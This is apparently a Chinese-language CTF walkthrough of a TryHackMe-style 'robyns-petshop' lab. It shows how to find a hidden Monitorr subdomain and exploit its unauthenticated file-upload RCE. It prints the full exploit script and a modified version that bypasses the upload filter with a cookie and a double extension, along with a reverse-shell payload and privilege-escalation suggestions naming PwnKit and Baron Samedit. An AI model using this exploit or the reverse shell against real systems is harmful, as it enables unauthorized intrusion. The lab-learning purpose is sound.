<p class='item-img' data-src='/pic/assets/homepage.png'><img src="/pic/assets/homepage.png" alt="homepage"></p>
<p>然而除了主页和contact页面以外没有别的其他信息了。当然可以通过之前目录发现的目录查看到一些文件，但总体来说也就能看出PicoCMS的版本，其他信息不是很有帮助。</p>
<p>8000端口是一个说是在开发中的站点，访问需要提供授权id，随意输了几个类似root，admin，robyn等id都没能成功访问，索性先不看了。</p>
<p class='item-img' data-src='/pic/assets/rabbithole2.png'><img src="/pic/assets/rabbithole2.png" alt="rabbithole2"></p>
<p>8096端口上了就是一个登录页面，尝试了几个弱密码都没成功，点击忘记密码说明是需要内部网络环境才能激活忘记密码的流程，暂时没有什么好的利用方式。也先过吧。</p>
<p class='item-img' data-src='/pic/assets/rabbithole.png'><img src="/pic/assets/rabbithole.png" alt="rabbithole"></p>
<p>兜兜转转回到80端口的网站处，先是在exp-db上（Attack Box 的 searchspolit不知道为啥有点问题）搜了一下PicoCMS上相关的漏洞，发现有个文件包含的漏洞，尝试了一下没有成功，可能是版本的原因，毕竟那个漏洞的pico版本比较老。</p>
<p>这部分陷入了僵局，没办法了，去网上搜了下相关的workthrough，发现我遗漏了收集ssl证书信息这一步。</p>
<p>确实，ssl连接浏览器一直提示有问题，是该想到去看看的，我们直接在浏览器查看网站的证书信息。</p>
<p class='item-img' data-src='/pic/assets/ssl_certificate.png'><img src="/pic/assets/ssl_certificate.png" alt="ssl_certificate"></p>
<p>我们可以发现SAN里面的DNS Name还包含了其他几个域名，我们把它们加入hosts中访问看看。</p>
<p class='item-img' data-src='/pic/assets/vim-etc-hosts.png'><img src="/pic/assets/vim-etc-hosts.png" alt="vim-etc-hosts"></p>
<p>我们可以发现beta和dev开头的都会指向初始的网页。而monitorr开头的网页则指向了一个新的网站。</p>
<p class='item-img' data-src='/pic/assets/monitor.png'><img src="/pic/assets/monitor.png" alt="monitor"></p>
<h3 id="monitorr漏洞利用"><a href="#monitorr漏洞利用" class="headerlink" title="monitorr漏洞利用"></a>monitorr漏洞利用</h3><p>从网页的底部我们可以看这个Monitorr是一个github上的开源项目，我们点进去查看可以发现其是用于管理PHP网页的。我们点击底下的Monitorr Setting会进入到管理页面。</p>
<p class='item-img' data-src='/pic/assets/monitorr-seting.png'><img src="/pic/assets/monitorr-seting.png" alt="monitorr-seting"></p>
<p>然而需要登录，简单的弱密码也登陆不了。</p>
<p>不过Monitorr本身有没有漏洞可以利用呢，我们直接去exp-db上查一下，发现还真有。</p>
<p class='item-img' data-src='/pic/assets/seacrh-mon.png'><img src="/pic/assets/seacrh-mon.png" alt="seacrh-mon"></p>
<p>我们直接试试第二个，因为远程代码执行通常意味着拿shell。</p>
<p>下载脚本下来运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># python3 48980.py https://monitorr.robyns-petshop.thm 10.10.242.231 443</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connectionpool.py&quot;</span>, line 710, <span class="hljs-keyword">in</span> urlopen<br>    chunked=chunked,<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connectionpool.py&quot;</span>, line 386, <span class="hljs-keyword">in</span> _make_request<br>    self._validate_conn(conn)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connectionpool.py&quot;</span>, line 1042, <span class="hljs-keyword">in</span> _validate_conn<br>    conn.connect()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connection.py&quot;</span>, line 424, <span class="hljs-keyword">in</span> connect<br>    tls_in_tls=tls_in_tls,<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/util/ssl_.py&quot;</span>, line 450, <span class="hljs-keyword">in</span> ssl_wrap_socket<br>    sock, context, tls_in_tls, server_hostname=server_hostname<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/util/ssl_.py&quot;</span>, line 493, <span class="hljs-keyword">in</span> _ssl_wrap_socket_impl<br>    <span class="hljs-built_in">return</span> ssl_context.wrap_socket(sock, server_hostname=server_hostname)<br>  File <span class="hljs-string">&quot;/usr/lib/python3.6/ssl.py&quot;</span>, line 407, <span class="hljs-keyword">in</span> wrap_socket<br>    _context=self, _session=session)<br>  File <span class="hljs-string">&quot;/usr/lib/python3.6/ssl.py&quot;</span>, line 817, <span class="hljs-keyword">in</span> __init__<br>    self.do_handshake()<br>  File <span class="hljs-string">&quot;/usr/lib/python3.6/ssl.py&quot;</span>, line 1077, <span class="hljs-keyword">in</span> do_handshake<br>    self._sslobj.do_handshake()<br>  File <span class="hljs-string">&quot;/usr/lib/python3.6/ssl.py&quot;</span>, line 689, <span class="hljs-keyword">in</span> do_handshake<br>    self._sslobj.do_handshake()<br>ssl.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:852)<br><br>During handling of the above exception, another exception occurred:<br><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/adapters.py&quot;</span>, line 499, <span class="hljs-keyword">in</span> send<br>    <span class="hljs-built_in">timeout</span>=<span class="hljs-built_in">timeout</span>,<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/connectionpool.py&quot;</span>, line 788, <span class="hljs-keyword">in</span> urlopen<br>    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/urllib3-1.26.12-py3.6.egg/urllib3/util/retry.py&quot;</span>, line 592, <span class="hljs-keyword">in</span> increment<br>    raise MaxRetryError(_pool, url, error or ResponseError(cause))<br>urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;monitorr.robyns-petshop.thm&#x27;</span>, port=443): Max retries exceeded with url: /assets/php/upload.php (Caused by SSLError(SSLError(1, <span class="hljs-string">&#x27;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:852)&#x27;</span>),))<br><br>During handling of the above exception, another exception occurred:<br><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;48980.py&quot;</span>, line 26, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    requests.post(url, headers=headers, data=data)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/api.py&quot;</span>, line 115, <span class="hljs-keyword">in</span> post<br>    <span class="hljs-built_in">return</span> request(<span class="hljs-string">&quot;post&quot;</span>, url, data=data, json=json, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/api.py&quot;</span>, line 59, <span class="hljs-keyword">in</span> request<br>    <span class="hljs-built_in">return</span> session.request(method=method, url=url, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/sessions.py&quot;</span>, line 587, <span class="hljs-keyword">in</span> request<br>    resp = self.send(prep, **send_kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/sessions.py&quot;</span>, line 701, <span class="hljs-keyword">in</span> send<br>    r = adapter.send(request, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.6/dist-packages/requests-2.28.1-py3.6.egg/requests/adapters.py&quot;</span>, line 563, <span class="hljs-keyword">in</span> send<br>    raise SSLError(e, request=request)<br>requests.exceptions.SSLError: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;monitorr.robyns-petshop.thm&#x27;</span>, port=443): Max retries exceeded with url: /assets/php/upload.php (Caused by SSLError(SSLError(1, <span class="hljs-string">&#x27;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:852)&#x27;</span>),))<br></code></pre></td></tr></table></figure>

<p>然而直接报错，错误说是ssl证书验证失败，我们直接把错误信息丢到搜索引擎查一下，发现只要把python里request请求的verify设置为False以及设置全局证书验证关闭即可，那我们改一下试一试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><br><span class="hljs-comment"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span><br><span class="hljs-comment"># Date: September 12, 2020</span><br><span class="hljs-comment"># Exploit Author: Lyhin&#x27;s Lab</span><br><span class="hljs-comment"># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span><br><span class="hljs-comment"># Software Link: https://github.com/Monitorr/Monitorr</span><br><span class="hljs-comment"># Version: 1.7.6m</span><br><span class="hljs-comment"># Tested on: Ubuntu 19</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-comment"># 关闭全局证书验证</span><br>ssl._create_default_https_context = ssl._create_unverified_context<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (sys.argv) != <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;specify params in format: python &quot;</span> + sys.argv[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot; target_url lhost lport&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;/assets/php/upload.php&quot;</span><br>    headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/plain, */*; q=0.01&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: sys.argv[<span class="hljs-number">1</span>]&#125;<br><br>    data = <span class="hljs-string">&quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&quot;</span>+sys.argv[<span class="hljs-number">2</span>] +<span class="hljs-string">&quot;/&quot;</span> + sys.argv[<span class="hljs-number">3</span>] + <span class="hljs-string">&quot; 0&gt;&amp;1&#x27;\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;</span><br>	<span class="hljs-comment">#request验证关闭</span><br>    requests.post(url, headers=headers, data=data, verify=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;A shell script should be uploaded. Now we try to execute it&quot;</span>)<br>    url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;/assets/data/usrimg/she_ll.php&quot;</span><br>    headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>    <span class="hljs-comment">#request验证关闭</span><br>    requests.get(url, headers=headers, verify=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>

<p>开启nc监听并再次尝试运行exp发现并没有收到反弹shell，虽然提示是成功了。我们根据代码地址在<code>/assets/data/usrimg/</code>路径下只发现了一个usrimg.png，说明我们的反弹shell并没能成功传上去。</p>
<p>我们再细看下代码，发现他是利用了<code>/assets/php/upload.php</code>传图片到服务器上的， 相当于利用了文件上传漏洞。我们直接访问下该网址发现有什么返回。</p>
<p class='item-img' data-src='/pic/assets/upload-pos.png'><img src="/pic/assets/upload-pos.png" alt="upload-pos"></p>
<p>发现报错了，错误信息提示不是图片或超过最大上传大小限制。</p>
<p>那我们尝试一下用curl调试一下看看上传到底是哪里出了问题吧。我们根据exp里的上传部分构造一下curl的上传语句。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># curl -F &quot;fileToUpload=@test.png&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php</span><br>curl: (60) SSL certificate problem: unable to get <span class="hljs-built_in">local</span> issuer certificate<br>More details here: https://curl.haxx.se/docs/sslcerts.html<br><br>curl failed to verify the legitimacy of the server and therefore could not<br>establish a secure connection to it. To learn more about this situation and<br>how to fix it, please visit the web page mentioned above.<br><br></code></pre></td></tr></table></figure>

<p>错误信息查了一下还是ssl证书的问题，只要加上<code>-k</code>跳过 SSL 检测就可以了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># curl -k -F &quot;fileToUpload=@test.png&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php</span><br>&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;uploadreturn&#x27;</span>&gt;You are an exploit.&lt;/div&gt;&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;uploaderror&#x27;</span>&gt;ERROR: test.png was not uploaded.&lt;/div&gt;&lt;/div&gt;<br></code></pre></td></tr></table></figure>

<p>发现又有新问题。他说我们是在exploit。很奇怪，直接访问也没显示这个错误啊。其次我这test.png就是一张图片，也不是php一句话木马，为啥会说我在exploit。</p>
<p>我们回到upload.php网页用F12查看一下请求信息，看看是不是漏了什么。</p>
<p class='item-img' data-src='/pic/assets/no-error.png'><img src="/pic/assets/no-error.png" alt="no-error"></p>
<p>细看一下请求里面有cookie，内容是isHuman和PHPSESSID，难道是我们没有cookie被认为是构造的攻击？</p>
<p class='item-img' data-src='/pic/assets/cookie.png'><img src="/pic/assets/cookie.png" alt="cookie"></p>
<p>那我们就把cookie内容复制过来再试试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># curl -k -F &quot;fileToUpload=@test.png&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;cookie: isHuman=1, PHPSESSID=gahu52u8e4u03qgav5hhvvku97&quot;</span><br>&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;uploadreturn&#x27;</span>&gt;File test.png is an image: &lt;br&gt;&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;uploadok&#x27;</span>&gt;File test.png has been uploaded to: ../data/usrimg/test.png&lt;/div&gt;&lt;/div&gt;<br></code></pre></td></tr></table></figure>

<p>发现成功传上去。</p>
<p>那我们构造一下我们的反弹shell，内容可以直接抄exp里面的部分<code>GIF89a213213123&lt;?php shell_exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.242.231/8080 0&gt;&amp;1&#39;&quot;);?&gt;</code>这样有个gif的文件头应该不会被识别出来，然而并不行，在我们尝试了双后缀和PHP大写后才成功完成上传。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># vim shell.png.PHP </span><br>root@ip-10-10-242-231:~<span class="hljs-comment"># curl -k -F &quot;fileToUpload=@shell.png.PHP&quot; https://monitorr.robyns-petshop.thm/assets/php/upload.php -H &quot;cookie: isHuman=1, PHPSESSID=gahu52u8e4u03qgav5hhvvku97&quot;</span><br>&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;uploadreturn&#x27;</span>&gt;File shell.png.PHP is an image: &lt;br&gt;&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;uploadok&#x27;</span>&gt;File shell.png.PHP has been uploaded to: ../data/usrimg/shell.png.php&lt;<br></code></pre></td></tr></table></figure>

<p>我们直接请求上传后的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">root@ip-10-10-242-231:~# curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/shell.png.php<br></code></pre></td></tr></table></figure>

<p>成功拿到shell。</p>
<h3 id="修改exp"><a href="#修改exp" class="headerlink" title="修改exp"></a>修改exp</h3><p>当然我们测试出上传失败的原因后也可以直接修改一下exp让其能成功利用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><br><span class="hljs-comment"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span><br><span class="hljs-comment"># Date: September 12, 2020</span><br><span class="hljs-comment"># Exploit Author: Lyhin&#x27;s Lab</span><br><span class="hljs-comment"># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span><br><span class="hljs-comment"># Software Link: https://github.com/Monitorr/Monitorr</span><br><span class="hljs-comment"># Version: 1.7.6m</span><br><span class="hljs-comment"># Tested on: Ubuntu 19</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ssl<br><br><span class="hljs-comment">#关掉ssl证书验证</span><br>ssl._create_default_https_context = ssl._create_unverified_context<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (sys.argv) != <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;specify params in format: python &quot;</span> + sys.argv[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot; target_url lhost lport&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;/assets/php/upload.php&quot;</span><br>    <span class="hljs-comment"># headers中加入cookie</span><br>    headers = &#123;<span class="hljs-string">&quot;cookie&quot;</span>: <span class="hljs-string">&quot;isHuman=1; PHPSESSID=gahu52u8e4u03qgav5hhvvku97&quot;</span>, <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/plain, */*; q=0.01&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: sys.argv[<span class="hljs-number">1</span>]&#125;<br>	<span class="hljs-comment"># 把上传文件的名字改成双后缀并大写PHP绕过文件过滤</span><br>    data = <span class="hljs-string">&quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.gif.PHP\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&quot;</span>+sys.argv[<span class="hljs-number">2</span>] +<span class="hljs-string">&quot;/&quot;</span> + sys.argv[<span class="hljs-number">3</span>] + <span class="hljs-string">&quot; 0&gt;&amp;1&#x27;\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;</span><br>	<br>    requests.post(url, headers=headers, data=data, verify=<span class="hljs-literal">False</span>)<span class="hljs-comment">#关掉ssl证书验证</span><br><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;A shell script should be uploaded. Now we try to execute it&quot;</span>)<br>    url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;/assets/data/usrimg/she_ll.gif.php&quot;</span><br>    headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br>    requests.get(url, headers=headers, verify=<span class="hljs-literal">False</span>)<span class="hljs-comment">#关掉ssl证书验证        </span><br></code></pre></td></tr></table></figure>

<p>也能成功拿shell。</p>
<p class='item-img' data-src='/pic/assets/after-change.png'><img src="/pic/assets/after-change.png" alt="after-change"></p>
<p>user flag就在<code>/var/www</code>下，忘记截图了，自己看一下就好。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登进来<code>sudo -l</code>和查找SUID位文件都没发现有用的，定时任务也没啥可以用的。手动遍历了下文件也没有什么信息。</p>
<p>直接上linpeas把。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] [CVE-2021-4034] PwnKit<br><br>   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt<br>   Exposure: probable<br>   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro<br>   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main<br><br>[+] [CVE-2021-3156] sudo Baron Samedit<br><br>   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt<br>   Exposure: probable<br>   Tags: mint=19,[ ubuntu=18|20 ], debian=10<br>   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main<br><br>[+] [CVE-2021-3156] sudo Baron Samedit 2<br><br>   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt<br>   Exposure: probable<br>   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 